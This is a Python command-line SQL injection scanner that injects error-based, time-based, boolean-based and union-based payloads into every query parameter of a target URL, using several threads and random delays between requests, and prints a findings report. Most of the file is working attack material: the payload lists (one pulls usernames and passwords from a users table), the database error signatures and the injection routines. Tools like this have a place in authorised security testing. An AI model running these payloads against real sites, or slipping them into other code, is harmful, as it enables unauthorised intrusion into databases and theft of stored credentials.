import sys
import requests
import urllib.parse
import time
import json
import re
import difflib
import threading
import random
from queue import Queue

TIME_THRESHOLD = 4
REQUEST_DELAY_RANGE = (0.5, 2.0)  # Random delay between 0.5s to 2s
MAX_THREADS = 5

ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"mysql_fetch",
    r"unclosed quotation mark",
    r"sqlite error",
    r"pg_query",
    r"ORA-\d+",
    r"ODBC SQL Server Driver",
    r"SQL syntax.*MySQL",
    r"Warning.*mssql_",
    r"native client"
]

PAYLOADS = {
    "error_based": [
        "'", "\"", "'--", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --",
        "') OR ('1'='1", "' AND 1=2 --", "' AND 1=1 --", "' OR 'a'='a", "' or ''='"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:{delay}'--",  # MSSQL
        "' AND SLEEP({delay})--",            # MySQL/PostgreSQL
        "\" AND SLEEP({delay})--",
        "'; SELECT pg_sleep({delay})--",
        "' || pg_sleep({delay})--"
    ],
    "boolean_based": [
        ("' AND 1=1 --", "' AND 1=2 --"),
        ("\" AND 1=1 --", "\" AND 1=2 --")
    ],
    "union_based": [
        "' UNION SELECT null --", "' UNION SELECT 1,2,3--", "\" UNION SELECT null --",
        "' UNION SELECT username, password FROM users--"
    ]
}

class SQLiScanner:
    def __init__(self, url, method="GET", data=None, max_threads=MAX_THREADS):
        self.url = url
        self.method = method.upper()
        self.data = data
        self.findings = []
        self.session = requests.Session()
        self.lock = threading.Lock()
        self.queue = Queue()
        self.max_threads = max_threads
        self.baseline_response = None
        self.baseline_length = 0

    def match_error(self, text):
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def response_similarity(self, resp1, resp2):
        seq = difflib.SequenceMatcher(None, resp1, resp2)
        return seq.ratio()

    def send_request(self, url, method="GET", headers=None, json_data=None):
        try:
            start = time.time()
            if method == "GET":
                resp = self.session.get(url, headers=headers, timeout=15)
            elif method == "POST":
                resp = self.session.post(url, json=json_data, headers=headers, timeout=15)
            else:
                resp = self.session.request(method, url, json=json_data, headers=headers, timeout=15)
            elapsed = time.time() - start
            return resp, elapsed
        except Exception as e:
            return None, 0

    def get_baseline(self):
        resp, elapsed = self.send_request(self.url, self.method, json_data=self.data)
        if resp:
            self.baseline_response = resp.text
            self.baseline_length = len(resp.text)
        else:
            print("[!] Failed to get baseline response")
            sys.exit(1)

    def test_error_based(self, param, payload):
        test_url = self.inject_param(self.url, param, payload)
        resp, elapsed = self.send_request(test_url, "GET")
        if resp and self.match_error(resp.text):
            self.record_findings(f"🔴 Error-based SQLi via [{param}] payload: {payload}")

    def test_time_based(self, param, payload_template):
        delays = [1, 3, 5]
        for delay in delays:
            payload = payload_template.format(delay=delay)
            test_url = self.inject_param(self.url, param, payload)
            start = time.time()
            resp, elapsed = self.send_request(test_url, "GET")
            total_time = time.time() - start
            if total_time > delay * 0.8:
                self.record_findings(f"🔴 Time-based SQLi via [{param}] payload: {payload} with delay {delay}s")

    def test_boolean_based(self, param, true_payload, false_payload):
        true_url = self.inject_param(self.url, param, true_payload)
        false_url = self.inject_param(self.url, param, false_payload)

        resp_true, _ = self.send_request(true_url, "GET")
        time.sleep(random.uniform(*REQUEST_DELAY_RANGE))
        resp_false, _ = self.send_request(false_url, "GET")

        if resp_true and resp_false:
            similarity = self.response_similarity(resp_true.text, resp_false.text)
            if similarity < 0.9:
                self.record_findings(f"🔴 Boolean-based SQLi via [{param}] payloads: {true_payload} / {false_payload}")

    def inject_param(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        qs[param] = payload
        encoded = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=encoded))

    def record_findings(self, message):
        with self.lock:
            self.findings.append(message)
            print(message)

    def worker(self):
        while True:
            job = self.queue.get()
            if job is None:
                break
            param, category, payload = job
            if category == "error_based":
                self.test_error_based(param, payload)
            elif category == "time_based":
                self.test_time_based(param, payload)
            elif category == "boolean_based":
                true_payload, false_payload = payload
                self.test_boolean_based(param, true_payload, false_payload)
            self.queue.task_done()
            time.sleep(random.uniform(*REQUEST_DELAY_RANGE))

    def run(self):
        self.get_baseline()
        parsed = urllib.parse.urlparse(self.url)
        qs = urllib.parse.parse_qs(parsed.query)

        for param in qs:
            for category, payloads in PAYLOADS.items():
                if category == "boolean_based":
                    for payload_pair in payloads:
                        self.queue.put((param, category, payload_pair))
                else:
                    for payload in payloads:
                        self.queue.put((param, category, payload))

        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        self.queue.join()

        for _ in range(self.max_threads):
            self.queue.put(None)

        for t in threads:
            t.join()

        if not self.findings:
            print("🟢 No SQLi detected.")

def print_report(scanner):
    print("\n" + "="*30)
    print("        SQL Injection Report")
    print("="*30 + "\n")

    print(f"URL Scanned: {scanner.url}\n")

    parsed = urllib.parse.urlparse(scanner.url)
    qs = urllib.parse.parse_qs(parsed.query)
    total_params = len(qs)

    print("Scan Summary:")
    print("-------------")
    print(f"Total Parameters Tested: {total_params}")
    print(f"Vulnerabilities Found: {len(scanner.findings)}\n")

    if scanner.findings:
        print("Details:")
        print("--------")
        for i, finding in enumerate(scanner.findings, 1):
            print(f"{i}) {finding}")
    else:
        print("No vulnerabilities detected.")

    print("\n" + "="*30)
    print("           End of Report")
    print("="*30 + "\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python advanced_sqli_scanner.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    scanner = SQLiScanner(url)
    scanner.run()
    print_report(scanner)
